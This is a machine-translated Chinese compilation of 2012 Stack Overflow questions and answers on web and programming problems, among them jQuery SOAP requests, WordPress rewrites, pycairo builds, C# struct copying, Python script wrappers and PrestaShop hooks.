<td><? echo $rows['name']; ?></td>
<td><? echo $rows['ask']; ?></td>
<td><? echo $rows['time']; ?></td>

<?php
$i<3?$i++:$i=0;
}
?> 
```

如果您想使用 rgb 颜色模式，请像这样替换，然后将颜色名称更改为 rgb 比例，例如 rgb(100,100,100)

# jquery - jquery ajax 不起作用

> ID：13429550
> 
> 赞同：0
> 
> 时间：2012-11-17T10:08:10.613
> 
> 标签：jquery, post, character-encoding, urlencode

这是我的 $.ajax() 代码，但我无法让它工作。

在我将表单从 contentType: 更改`"text/xml ; ",**` 为`contentType: "text/xml ; charset=UTF-8",`

请求被破坏。但是，根据官方文档：[api/$.ajax](http://api.jquery.com/jQuery.ajax/)，我必须这样做，否则字符集将与服务器相同。

```
var soapRequest_add_a_new_story_to_db=
'<?xml version="1.0" encoding="utf-8"?>'+
  '<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" '+
'xmlns:xsd="http://www.w3.org/2001/XMLSchema" '+
     'xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">'+
  '<soap:Body> '+
    '<AddNewStory xmlns="http://x.x.x.x/StoryForMac/">'+
  '<StoryID>'+story_id+'</StoryID>'+
  '<UserName>' +User_Name+ '</UserName>'+
  '<Story_CreateTime>'+Edit_Time+'</Story_CreateTime>'+
  '<StoryName>'+Story_Name+'</StoryName>'+
'</AddNewStory>'+
'</soap:Body>'+
'</soap:Envelope>'; 

        $.ajax({
            type: "POST",
            url: webServiceAddNewStoryToDbUrl,
            contentType: "text/xml ; charset=UTF-8",
            dataType: "xml",    
            data: soapRequest_add_a_new_story_to_db,        
            success: processSuccess,        //If the SOAP connection sucessess, the function: processSuccess() will be called.  
            error: processError     
        }); 
```

我的另一个相关紧急问题[Chinese Character 没有出现。](https://stackoverflow.com/questions/13270123/chinese-string-cant-be-recognized-after-the-ajax-request)和这个类似，如果有的话，请看一下。

**更新：**
请阅读[文档的这一部分](http://api.jquery.com/jQuery.ajax/)，（ctr+f，跳转到“processData”）。
我认为我的数据已经是一个查询字符串，所以我忽略了选项：processData。文档说：*“如果要发送 DOMDocument 或其他未处理的数据，请将此选项设置为 false。”* 但我的**soapRequest_add_a_new_story_to_db**不是 DOMDocument。“未处理”数据的定义是什么？请给出解释和相关参考文件。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T11:37:35.297

In your ajax call you have to prevent the processing of your data. You basically tell jquery: "don't touch my request and response data I know what I'm doing." The data in your request var is a valid soap message as is, so you want to prevent that jquery tries to convert it (which it will do for json or xml data).

```
 $.ajax({
        type: "POST",
        url: webServiceAddNewStoryToDbUrl,
        contentType: "text/xml; charset=\"UTF-8\"",
        dataType: "xml",   
        processData: false, 
        data: soapRequest_add_a_new_story_to_db,        
        success: processSuccess, //If the SOAP connection sucessess, the function: processSuccess() will be called.  
        error: processError     
    }); 
```

# url - 喜欢按钮可疑网址错误

> ID：13429555
> 
> 赞同：1
> 
> 时间：2012-11-17T10:09:26.873
> 
> 标签：url, facebook-like

我在谷歌网站上创建了一个网站，使用我自己的域名。单击“赞”按钮（生成 steegle.com）会出现错误：“抱歉，此帖子包含可疑 URL：未知错误”。关于如何修复此问题或使用更好的代码的任何想法？

这是生成/使用的代码：

<img src="https://www.google.com/chart?chc=sites&cht=d&chdp=sites&chl=%5B%5BGoogle+Gadget'%3D20'f%5Cv'a%5C%3D0'10'%3D199' 0'dim'%5Cbox1'b%5CF6F6F6'fC%5CF6F6F6'eC%5C0'sk'%5C%5B%22Steeglecom+-+Google+Sites+Like+Button%22'%5D'a%5CV%5C%3D12' f%5C%5DV%5Cta%5C%3D10'%3D0'%3D200'%3D32'dim'%5C%3D10'%3D10'%3D200'%3D32'vdim'%5Cbox1'b%5Cva%5CF6F6F6'fC% 5CC8C8C8'eC%5C'a%5C%5Do%5CLauto'f%5C&sig=adcK6vIIXtgjrIIlMyRBX2yiuVI" data-igsrc="http://86.gmodules.com/ig/ifr?mid=86&synd=trogedit&url=http%3A%2F %2Fhosting.gmodules.com%2Fig%2Fgadgets%2Ffile%2F110509162544058635853%2Fsteegle-google-sites-facebook-like-button.xml&up_url=www.freeeducationleague.org&up_layout=standard&up_width=&up_showfaces=false&up_action=like&up_font=arial&up_colorscheme=light&h=35&w=200" data-type="ggs-gadget" data-props="screenshot:http#58//www.steegle.com/images/facebook-like-120x60.png ;url:http#58//hosting.gmodules.com/ig/gadgets/file/110509162544058635853/steegle-google-sites-facebook-like-button.xml;params:up_url=www.freeeducationleague.org&up_layout=standard&up_width=&up_showfaces= false&up_action=like&up_font=arial&up_colorscheme=light;align:;borderTitle:Steegle.com - Google Sites Like Button;height:35;igsrc:http#58//95.gmodules.com/ig/ifr?mid=95&synd=trogedit&url=http %3A%2F%2Fhosting.gmodules.com%2Fig%2Fgadgets%2Ffile%2F110509162544058635853%2Fsteegle-google-sites-facebook-like-button.xml&up_url=www.freeeducationleague.org;mid:95;scrolling:no;showBorder:false ;showBorderTitle:null;spec:http#58//hosting.gmodules.com/ig/gadgets/file/110509162544058635853/steegle-google-sites-facebook-like-button.xml;up_url:www.freeeducationleague.org;width:200 ;wrap:true;title:Steegle.com - Google Sites Like Button" width="200" height="35" style="display:inline;float:right;margin:5px 0 5px 20px;" class="igm" >

# wordpress - 在 wordpress 中找不到页面

> ID：13429556
> 
> 赞同：1
> 
> 时间：2012-11-17T10:09:26.680
> 
> 标签：wordpress

我已经`wordpress`在域内安装了一个`folder name`，`questions`登陆页面工作正常，没有其他`links`工作，它说`page not found`。该怎么办 ？？

使用 .htaccess 之类的

```
RewriteEngine On
RewriteBase /
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . questions/ [L] 
```

它只运行 index.php 页面。有什么帮助吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-17T10:11:40.137

看起来你需要 rewritebase 因为你的父文件夹上有一个 htaccess

```
RewriteEngine On
RewriteBase /questions/
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . /questions/ [L] 
```

* * *

您是否将其放在站点根目录下名为 /questions 的子文件夹中？

如果是的话，我认为你需要改变

```
RewriteRule . questions/ [L] 
```

到

```
RewriteRule . /questions/ [L] 
```

或者试试这个而不是 rewritebase

```
<IfModule mod_rewrite.c>
    RewriteEngine On
    RewriteCond %{REQUEST_FILENAME} !-f
    RewriteCond %{REQUEST_FILENAME} !-d
    RewriteRule . /questions/ [L]
</IfModule> 
```

# asp.net - 如何在 umbraco 中添加波斯语或其他语言的 Datatimepicker？

> ID：13429558
> 
> 赞同：5
> 
> 时间：2012-11-17T10:09:36.310
> 
> 标签：asp.net, datepicker, umbraco, datetimepicker, persian

我需要在我的网站中添加一个波斯语（shamsi）日期时间选择器。我知道 Asp.net 或 C# 中的波斯语数据时间选择器，但我使用的是 umbraco，需要在 umbraco 中添加 persiandatetimepicker，它可以使用和更改 persiandatetimepickers 代码我的代码。我该怎么做？

我找到了这个链接： http: [//our.umbraco.org/forum/developers/api-questions/19718-Using-Umbraco-Date-Time-Picker-in-ASCX-file](http://our.umbraco.org/forum/developers/api-questions/19718-Using-Umbraco-Date-Time-Picker-in-ASCX-file)

但没用。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-18T01:07:43.893

您可以在 Umbraco 中创建新的数据类型，以您自己的风格和偏好来存储和呈现日期。该过程涉及创建几个类，其中一个实现称为 IDataType 的接口。Umbraco 总部的员工 Tim Geyssens 在[这里](http://www.nibble.be/?p=50)有一篇很棒的关于基础知识的博文。

# php - html5多次上传图片

> ID：13429559
> 
> 赞同：1
> 
> 时间：2012-11-17T10:09:40.690
> 
> 标签：php, javascript, jquery, html

`html5`怎么可以通过and`js`和and多上传图片`php`，请给我一个demo或者例子？

**不使用插件**

我尝试在 html 中使用此代码并选择多图像：

```
<input type="file" name="upload[]" multiple="multiple"> 
```

但我在 php 代码中只给出了一张图片：

```
foreach( $_FILES['upload'] as $key => $all ){
            foreach( $all as $i => $val ){
                $new[$i][$key] = $val;    
            }    
        }
        echo '<pre>';
        print_r($new); 
```

我该怎么办？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-17T10:13:39.753

[Plupload](http://www.plupload.com/)是一个非常好的文件上传器

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-21T11:50:27.590

具有多个文件选择、拖放支持、进度条和预览图像的文件上传。 [文件上传示例](http://blueimp.github.com/jQuery-File-Upload/)

# python - 尝试在 mac 10.8 上构建 pycairo

> ID：13429564
> 
> 赞同：1
> 
> 时间：2012-11-17T10:10:48.207
> 
> 标签：python, cairo, pycairo

我有两个 Python 安装。操作系统自带的和我手动下载安装的都是2.7。

我手动下载的是我的默认 Python。`which python`返回

`/Library/Frameworks/Python.framework/Versions/2.7/bin/python`

我已经手动安装了 Cairo。

然后我下载了py2cairo，进入目录并运行`./waf configure`，然后返回......

```
 ./set_options
  ./init
  ./configure
Checking for program gcc or cc           : /usr/bin/gcc 
Checking for program cpp                 : /usr/bin/cpp 
Checking for program ar                  : /usr/bin/ar 
Checking for program ranlib              : /usr/bin/ranlib 
Checking for gcc                         : ok  
Checking for program python              :/Library/Frameworks/Python.framework/Versions/2.7/Resources/Python.app/Contents/MacOS/Python 
Checking for Python version >= 2.6.0     : ok 2.7.3 
Checking for library python2.7           : yes 
Checking for program python2.7-config    :/Library/Frameworks/Python.framework/Versions/2.7/bin/python2.7-config 
Checking for header Python.h             : yes 
Checking for cairo >= 1.8.10             : yes 
'configure' finished successfully (0.978s)
  ./shutdown 
```

但是后来我尝试做的乳清`./waf build`，我收到了这个错误

```
 ./set_options
  ./init
Waf: Entering directory '/Users/jose/Downloads/pycairo-build'
  ./build
  src/build
[7/9] cc: src/surface.c -> ../pycairo-build/default/src/surface_2.o
In file included from ../pycairo-1.8.10/src/surface.c:1360:
/usr/local/include/cairo/cairo-xlib.h:44:22: error: X11/Xlib.h: No such file or directory
In file included from ../pycairo-1.8.10/src/surface.c:1360:
/usr/local/include/cairo/cairo-xlib.h:49: error: expected ‘)’ before ‘*’ token
/usr/local/include/cairo/cairo-xlib.h:56: error: expected ‘)’ before ‘*’ token
/usr/local/include/cairo/cairo-xlib.h:69: error: expected declaration specifiers or ‘...’ before ‘Drawable’
/usr/local/include/cairo/cairo-xlib.h:73: error: expected ‘=’, ‘,’, ‘;’, ‘asm’ or ‘__attribute__’ before ‘*’ token
/usr/local/include/cairo/cairo-xlib.h:77: error: expected ‘=’, ‘,’, ‘;’, ‘asm’ or ‘__attribute__’ before ‘cairo_xlib_surface_get_drawable’
/usr/local/include/cairo/cairo-xlib.h:79: error: expected ‘=’, ‘,’, ‘;’, ‘asm’ or ‘__attribute__’ before ‘*’ token
/usr/local/include/cairo/cairo-xlib.h:82: error: expected ‘=’, ‘,’, ‘;’, ‘asm’ or ‘__attribute__’ before ‘*’ token
Waf: Leaving directory `/Users/jose/Downloads/pycairo-build'
Build failed:  -> task failed (err #1): 
    {task: cc surface.c -> surface_2.o} 
```

有任何想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-17T17:14:55.943

X-Windows 文件位于“/usr/X11R6”中。如果您没有该目录，则说明您没有安装 X-Windows 开发包。

[https://trac.macports.org/wiki/InstallingMacPorts#a2.InstallXWindowsX11](https://trac.macports.org/wiki/InstallingMacPorts#a2.InstallXWindowsX11)

# c - 将 C 程序的输出存储在 shell 中

> ID：13429566
> 
> 赞同：0
> 
> 时间：2012-11-17T10:11:16.533
> 
> 标签：c, shell

我有一个 C 程序，它给出了一些输出。我正在通过 shell 编译 C 程序，但我需要`run`C 程序的输出并存储在 shell 中。

编辑。

将输出保存到 shell 变量。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-17T10:18:17.360

我假设您想将程序的输出存储在一个变量中。Unix shell 提供了一种称为**命令替换**的工具来执行此操作。根据您的外壳，您可以执行以下任一操作：

```
output=$(./run) 
```

或者

```
output=`./run` 
```

Bash 两者都支持。但是，如果要将输出保存到文件，则需要将标准输出流重定向到文件。你可以这样做：

```
./run > output.txt 
```

或者，如果您想在程序运行时查看输出并将其保存到输出文件中，您可以使用该`tee`实用程序并将程序的输出通过管道传输给它。

```
./run | tee output.txt 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-17T10:17:15.443

您可以将输出重定向到这样的文件中：

```
./run > file 
```

如果要将其存储到变量中，则必须确定我们正在谈论的 shell。这取决于您是否有 Windows shell 或 linux bash ..

# ruby-on-rails - ruby 正则表达式以确保电子邮件输入格式

> ID：13429571
> 
> 赞同：0
> 
> 时间：2012-11-17T10:11:45.207
> 
> 标签：ruby-on-rails, ruby, regex, ruby-on-rails-3

我们是否应该将正则表达式与 for 循环一起使用？例如，如果我想确保用户以如下格式在文本框中输入一堆电子邮件，那么最好的方法是什么？

```
Zoo bbb <zoo@email.com>, Alan T <at@gmail.xxx>, ........ 
```

我们如何提取信息并输入名称[]、电子邮件[]。？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-17T10:28:26.323

如果您想使用正则表达式，则以下模式将匹配：

```
<([\w+\.\@]+)>+

Match 1
1\.  zoo@email.com
Match 2
1\.  at@gmail.xxx 
```

您可以在以下位置进行测试：[http ://rubular.com](http://rubular.com)

您要做的是计算使用找到的匹配项`scan`

这是我放在一起的示例代码

```
s = "Zoo bbb <zoo@email.com>, Alan T <at@gmail.xxx>"

names = []
emails = []

s.scan(/[\s]?([\w\s]+)<([\w+\.\@]+)>+/).each do | m |
  names << m[0]
  emails << m[1]
end

puts "names = #{names}"
puts "emails = #{emails}" 
```

输出：

```
names = ["Zoo bbb ", "Alan T "]
emails = ["zoo@email.com", "at@gmail.xxx"] 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-17T10:39:05.050

尝试这个：

```
test_string = "Zoo bbb <zoo@email.com>, Alan T <at@gmail.xxx>, James B <james.bond@m5.gov.co.uk>"

# Create regexp to match emails given this format "Alan T <at@gmail.xxx>, ..."
regexp = /\s*,?\s*(.*?)<(.*?)>/

# Scan string for regexp matches
matches = test_string.scan(regexp)

# Let's see what the matches are...
p matches # [["Zoo bbb ", "zoo@email.com"], ["Alan T ", "at@gmail.xxx"], ["James B ", "james.bond@m5.gov.co.uk"]] 

# Iterating over matches is easy
matches.each do |match_array|
    puts "Name:\t #{match_array[0]}"
    puts "Email:\t #{match_array[1]}"
end

# To extract all names and emails into individual arrays:
names = []
emails = []
matches.each do |match_array|
    names << match_array[0]
    emails << match_array[1]
end

p names # ["Zoo bbb ", "Alan T ", "James B "] 
p emails # ["zoo@email.com", "at@gmail.xxx", "james.bond@m5.gov.co.uk"] 
```

# python - reStructuredText 的问题（使用 Portable Python）

> ID：13429573
> 
> 赞同：0
> 
> 时间：2012-11-17T10:12:02.227
> 
> 标签：python, r, restructuredtext

我正在尝试在 Windows XP 32 位计算机上使用[Matti Pastelli 的示例运行](http://mpastell.com/2010/03/25/create-odf-pdf-and-html-report-from-a-single-sweave-document/)[rst2odt.py](http://docutils.sourceforge.net/docs/user/odt.html)和[rst2wordml.py 。](http://docutils.sourceforge.net/sandbox/rst2wordml/readme.html)R 步骤运行良好，然后我得到文件 ascii-example.rst、ascii-example.rst 和 ascii-example.pdf。

使用 Portable Python 2.7.3.1 我收到以下错误： ![2731](../Images/0d6fafcf57ab1caec9f5afb4e3ce98b2.png)

使用 Portable Python 3.2.1.1 我收到以下错误： ![3211](../Images/e66ba0e74d77c178ea49e99ee99f752f.png)

我对 Python 语言几乎一无所知，因此我完全不知道该怎么做。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-17T11:07:39.303

**不是真正的答案，而是需要观察的一些观察结果**

很难说，但有两件事很突出 - 您收到的 2.7.x 版本的错误是`print`2.x 中的一个语句，并在 3.x 中更改为一个函数。因此，它不接受参数，因此错误。

在 2.x中`file`和`open`实际上是相同的东西，而在 3.x 系列`file`中被删除了，这是另一个错误。

至于您的“未完全指定图像大小且未安装 PIL” - 您要么需要查看 rst2ody 的帮助以查看是否可以指定它，要么安装 PIL（使用`pip`or很简单`easy_install`）。

恐怕我没有 Portable Python，虽然我可以提出一些建议，但我希望这至少能给你一些指导......

# c# - 为什么这个循环不能规范化我的 Vector2 列表？

> ID：13429578
> 
> 赞同：1
> 
> 时间：2012-11-17T10:12:55.860
> 
> 标签：c#, xna, foreach

请参阅以下代码：

```
 List<Vector2> axes = new List<Vector2>();
    axes.Add(TopRight() - TopLeft());
    axes.Add(BottomLeft() - TopLeft());
    axes.Add(otherRectangle.TopRight() - otherRectangle.TopLeft());
    axes.Add(otherRectangle.BottomLeft() - otherRectangle.TopLeft());
    // Try normalizing vectors?
    foreach (Vector2 axis in axes)
    {
        axis.Normalize();
    } 
```

该`Vector2.Normalize()`方法是一个 void 方法，用于规范化它所调用的向量。但是由于某种原因，当我执行此循环时，它不会对向量进行归一化。我只是无法以这种方式修改列表吗？

**一些怪事：**

*   使用 for 循环进行迭代，即`axis[i].Normalize()`不起作用。
*   使用内置迭代器进行`List<T>.ForEach`迭代不起作用。
*   在将向量添加到列表之前创建规范化向量而不是遍历列表*确实*有效。

为什么迭代不起作用？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-17T10:16:11.283

循环创建序列元素的`foreach`本地副本。您只对副本进行规范化。

您将需要执行以下操作：

```
for(int i=0; i<axes.Count; i++)
    axes[i] = Vector2.Normalize(axes[i]); 
```

这种不直观的行为再次证明了为什么改变结构的实例方法是一个坏主意。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-17T10:38:02.613

正如 CodesInChaos 所说，`Vector2.Normalize`这是一种设计糟糕的方法（这个决定的原因可能是出于性能考虑，但这对我们没有帮助）。

结果，它*改变*了它工作的对象。但是，该对象是外观中原始对象的*副本。*`foreach`因此，您的代码只会改变对象，而不是实际列表中的对象。

唯一的解决方法是对列表中的项目使用索引`for`循环：

```
for (int i = 0; i < axes.Count; i++) {
    Vector2 copy = axes[i];
    copy.Normalize();
    axes[i] = copy;
} 
```

在这里，我们修改了一个副本，但之后我们将它复制回实际的向量中。请注意，我们**不能**简单地`axes[i]`通过编写来进行修改`axes[i].Normalize()`——这可以说（在我看来）是 .NET 中的*另一个*设计缺陷。原因是该`axes[i]`操作是属性访问（访问`this[]`属性），它再次返回原始对象的*副本*。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-17T10:20:36.697

**更多编辑：** 首先尝试规范化向量，然后将它们添加到列表中......

```
List<Vector2> axes = new List<Vector2>();

Vector2 tempTopRightTopLeftVector = TopRight() - TopLeft();
tempTopRightTopLeftVector.Normalize();
axes.Add(tempTopRightTopLeftVector);

Vector2 tempBottomLeftTopRightVector = BottomLeft() - TopLeft();
tempBottomLeftTopRightVector.Normalize();
axes.Add(tempBottomLeftTopRightVector);

// and so on for other vectors... 
```

**更多编辑：**

尝试使用另一种类型的集合。以数组为例：

```
Vector2[] axes = new Vector2[] {
   TopRight() - TopLeft(),
   BottomLeft() - TopLeft(),
   otherRectangle.TopRight() - otherRectangle.TopLeft(),
   otherRectangle.BottomLeft() - otherRectangle.TopLeft()
}
for(int i=0; i<axes.Length; i++)
{
   axes[i].Normalize();
} 
```

# python - 有效地使用不同的脚本重新执行 Python 解释器

> ID：13429579
> 
> 赞同：2
> 
> 时间：2012-11-17T10:12:56.980
> 
> 标签：python

我正在研究用 Python 编写的包装器脚本。包装器应该根据系统状态选择另一个 Python 脚本并执行它（使用绝对路径）。无需返回父脚本。

应该注意的是，我无法控制正在运行的脚本。他们可以使用`__name__`检查、访问`sys.argv`，并且所有的行为都应该像直接运行脚本一样。

现在，我正在使用`os.execl()`：

```
import os, sys

# ...

os.execl(sys.executable, sys.executable, new_script, *sys.argv[1:]) 
```

但我至少可以算出三个问题：

1.  传递给 Python 解释器的任何选项都不会保留（例如`python -v wrapper`，在重新执行时不再冗长）；
2.  Python 解释器被不必要地重新执行（使用 PyPy 它在我的系统上增加了 0,7s）；
3.  它依赖于`sys.executable`有用，文档说：

    > 如果 Python 无法检索到其可执行文件的真实路径，`sys.executable`它将是一个空字符串或`None`.

我想知道我应该使用什么替代品`os.execl`来解决所有问题。到目前为止，我可以说：

1.  `execfile()`可能会工作，但它在 Python3 中被删除并手动重新实现它 AFAICS 是丑陋的（因为编码问题）。我不确定还有什么其他影响`execfile()`；
2.  `imp.load_module()`可能会工作，但它有点hacky并且在Python3.3中被弃用了。它也可能会遇到 Python3 编码问题。

您建议我使用哪种解决方案？

* * *

编辑：我会忘记的。该解决方案必须适用于 Python 2.5+、PyPy 和 Jython 2.5+。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-18T23:06:34.580

我只会使用`execfile()`而不是`imp.load_module()`. 尽管控制权将返回给执行脚本，但一大优势是，引用文档：

> 它与 import 语句的不同之处在于它不使用模块管理——它无条件地读取文件并且不创建新模块。

这意味着脚本文件可以在任何地方，可以有任何（或没有）文件扩展名，并且资源不会浪费在与模块导入相关的任务上。

这样做会自动完成或避免您想要的事情：

1.  解释器选项将被保留
2.  解释器不会被不必要地重新执行
3.  它不依赖于`sys.executable`

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-11-17T17:18:43.767

你有没有尝试过这样的事情？

```
### wrapped script ###

import sys

print("__name__: {0}\nsys.argv: {1}".format(__name__, sys.argv)) 
```

```
### wrapper script ###

import builtins, sys

my_script = "wrapped_script.py"

print("Executing the wrapped script...")

sys.argv[0] = my_script
with open(my_script, 'r') as fd:
    for line in fd:
        exec(line) 
```

结果：

```
$ python3 wrapped_script.py --foo --bar=quux
__name__: __main__
sys.argv: ['wrapped_script.py', '--foo', '--bar=quux']

$ python3 wrapper.py --foo --bar=quux
Executing the wrapped script...
__name__: __main__
sys.argv: ['wrapped_script.py', '--foo', '--bar=quux'] 
```

# blackberry-simulator - BB 10 dev alpha 模拟器未加载

> ID：13429589
> 
> 赞同：1
> 
> 时间：2012-11-17T10:14:35.977
> 
> 标签：blackberry-simulator

我在 windows XP 中安装了 Vmware player 4.0.4, BB10 dev alpha 模拟器。玩虚拟机时，它说[启动服务：屏幕]，一段时间后给出错误“无法打开文件进行写入。2（没有这样的文件或目录）。”

请提出解决方案。谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T15:36:57.720

我刚刚在启动负载冻结

> 启动服务：屏幕。

尽量不要更改虚拟机的显示设置，保持为“使用主机设置进行监视器”。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-08-28T00:34:41.287

在您的系统启动后，它将让您简要地通过分辨率列表，除非您手动更改它，否则系统将在 5 秒后继续启动，默认情况下从列表中选择第一个模式，

为了绕过这种错误，我在列表底部选择了一种安全的建议模式，例如：在下面的屏幕截图中，它将是 4,5 或 6

PS：不要忘记单击 VMWarePlayer 窗口内的某处与加载的系统交互，然后用键盘输入选择号，然后输入 enter（在 5 秒过去之前）

[![在此处输入图像描述](../Images/2c886e82a206d4a47e86129b4fc5b60c.png)](https://i.stack.imgur.com/o1AcX.png)

# http - 在 RESTfull api 中组织缓存并减少服务器负载的最佳方式（或标准做法）是什么？

> ID：13429592
> 
> 赞同：1
> 
> 时间：2012-11-17T10:14:49.553
> 
> 标签：http, caching, cache-control

HTTP 缓存。

如果我说 HTTP 缓存是用于发送还是不发送内容（正文，而不是标题；））给客户端，我是对的吗？它有助于减少服务器和客户端之间传输的数据数量，但不会减少服务器上的负载。HTTP Cache 甚至不需要这样做。这不是它的问题。所以 HTTP Cache 不关心服务器端。

因此问题。减少服务器负载的最佳方法是什么。简化思路——如果我们不打算将该内容发送给客户端，为什么要生成响应内容。如果获取的数据不会发送到客户端，我们为什么要对数据库执行繁重的查询。是的，我们必须查明请求的数据是否被修改。也许我们可以以某种方式存储这些信息？但是，如果我们谈论的是高度动态的数据。例如，我们必须缓存检索一堆照片的请求，我们可以放置过滤器（按距离 - 大约 1000 米，按时间 - 1 小时内，按类别，...）和排序参数（按距离 - 最近给客户，按时间，...）在照片上。同一张照片可能会以不同的参数得到不同的响应。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-17T10:37:02.637

我们有这样的要求：[http://api.myproject/timeline?lat=41.00001&lon=35.80012&category=1&timelimit=60&distance=1000](http://api.myproject/timeline?lat=41.00001&lon=35.80012&category=1&timelimit=60&distance=1000)。我们必须为此请求创建一个唯一标识符。例如，我们正在基于 GET 参数创建此标识符 - **request_key**。当我们获取响应数据（执行数据库查询，准备响应数据等）时，我们必须计算获取数据的哈希值 - **data_key**. 现在我们有 2 个键 - 查询标识符和数据键。我们存储这 2 个键和对象 ID。它可以/必须是快速存储：memcache 或 redis。之后，我们向客户端发送响应并将带有 data_key 的 Etag 放入标头中。当客户端再次请求获取数据时，我们将生成请求键，尝试在内存缓存中找到该键的值。如果我们找到请求密钥并且 Etag（取自 hreader）与 data_key 匹配，我们就知道该请求的数据没有更改，并且只是将 304 http 代码返回给客户端。当一个对象改变时，我们必须从这个对象发生的内存缓存中删除所有存储的 request_key 和 data_key 对。出于这个原因，我们将对象 id 与对 (request_key, data_key) 一起存储。

# prestashop - Prestashop 模块已安装但无法按预期工作

> ID：13429599
> 
> 赞同：0
> 
> 时间：2012-11-17T10:15:35.277
> 
> 标签：prestashop

我有一个 prestashop 插件，它向产品页面添加了一个额外的选项卡：

```
<?php

// Disable direct addressing to the script:
if (!defined('_PS_VERSION_'))
    exit;

//Create module class:
class producttab extends Module {

//Class constructor that contains its configuration:
public function __construct()
{
    $this->name = "producttab"; //Module name
    $this->tab = "front_office_features"; //Tab with the module in Prestashop back-office modules list
    $this->version = "1.0"; // Module version
    $this->author = "BelVG";  // Module author 
    parent::__construct();
    $this->displayName = $this->l("Product Tab"); // Module title
    $this->description = $this->l("Module creates a new tab on the frontend product page "); // Module description 
}

//Module installation-method:
public function install()
{
    return (parent::install()
            AND $this->registerHook('productTab') //Register productTab hook that will display the tab button
            AND $this->registerHook('productTabContent') //Register productTabContent hook that will display the tab content
            );
}

//Module deinstallation-method:
public function uninstall()
{
    return (parent::uninstall()
            AND $this->unregisterHook('productTab')
            AND $this->unregisterHook('productTabContent')); // Delete all hooks, registered by the  module 
}

//Method will be called while performing the "ProductTab" hook (tab buttons generation):
public function hookProductTab($params)
{
    global $smarty;
    //Call the template containing the HTML-code ?? our button
    return $this->display(__FILE__ , 'tpl/productTab.tpl');
}

public function hookProductTabContent($params)
{
    global $smarty;
    //Transfer the new tab content into template via smatry
    //( it is optional as far as the content can be assigned directly in the template)
     $result = Db::getInstance()->executeS('SELECT * FROM ps_cms_lang WHERE id_cms =14');

$smarty->assign('content', $result);
    // Call the template containing the HTML-code of our new tab content:
    return $this->display(__FILE__ , 'tpl/productTabContent.tpl');
}

}
?> 
```

该模块按预期工作。我正在尝试调整相同的代码以添加另一个选项卡。由于某种原因，安装了新模块，但该选项卡没有出现。有什么我想念的吗？

```
<?php

// Disable direct addressing to the script:
if (!defined('_PS_VERSION_'))
exit;

//Create module class:
class jewellerytab extends Module {

//Class constructor that contains its configuration:
public function __construct()
{
    $this->name = "jewellerytab"; //Module name
    $this->tab = "front_office_features"; //Tab with the module in Prestashop back-office modules list
    $this->version = "1.0"; // Module version
    $this->author = "Mike Rifgin";  // Module author 
    parent::__construct();
    $this->displayName = $this->l("jewellery Tab"); // Module title
    $this->description = $this->l("Module creates a new tab on the frontend jewellery page "); // Module description 
}

//Module installation-method:
public function install()
{
    return (parent::install()
            AND $this->registerHook('jewelleryTab') //Register jewelleryTab hook that will display the tab button
            AND $this->registerHook('jewelleryTabContent') //Register jewelleryTabContent hook that will display the tab content
            );
}

//Module deinstallation-method:
public function uninstall()
{
    return (parent::uninstall()
            AND $this->unregisterHook('jewelleryTab')
            AND $this->unregisterHook('jewelleryTabContent')); // Delete all hooks, registered by the  module 
}

//Method will be called while performing the "jewelleryTab" hook (tab buttons generation):
public function hookjewelleryTab($params)
{
    global $smarty;
    //Call the template containing the HTML-code ?? our button
    return $this->display(__FILE__ , 'tpl/jewelleryTab.tpl');
}

public function hookjewelleryTabContent($params)
{
    global $smarty;
    //Transfer the new tab content into template via smatry
    //( it is optional as far as the content can be assigned directly in the template)
     $result = Db::getInstance()->executeS('SELECT * FROM ps_cms_lang WHERE id_cms =14');

$smarty->assign('content', $result);
    // Call the template containing the HTML-code of our new tab content:
    return $this->display(__FILE__ , 'tpl/jewelleryTabContent.tpl');
}

}
?> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T20:51:30.327

没有珠宝标签和珠宝标签内容这样的钩子，您需要使用 productTab 和 productTabContent（这是 Prestashop 核心的一部分）在这里您可以找到 prestahop 1.5 的钩子列表[http://doc.prestashop.com/display/PS15/ Hooks+in+PrestaShop+1.5](http://doc.prestashop.com/display/PS15/Hooks+in+PrestaShop+1.5)和一些关于 prestashop 中的钩子的基本信息是[http://doc.prestashop.com/display/PS14/Understanding+and+using+hooks](http://doc.prestashop.com/display/PS14/Understanding+and+using+hooks)

您也可以尝试[联系 BelVG 的此扩展程序的作者Denis](http://blog.belvg.com/developer-tips-creating-a-tab-on-the-frontend-product-page-in-prestashop.html)

在这篇文章之后，丹尼斯开发了灵活[的扩展来添加额外的产品标签](http://module-presta.com/product-tabs.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-06-02T02:14:46.807

`jewelleryTab`并且`jewelleryTabContent`是自定义钩子。

您需要将这些钩子添加到您的`.tpl`模板文件中：

```
{hook h='jewelleryTab'}
{hook h='jewelleryTabContent'} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-12-10T12:47:11.130

我们只能使用预定义的钩子。

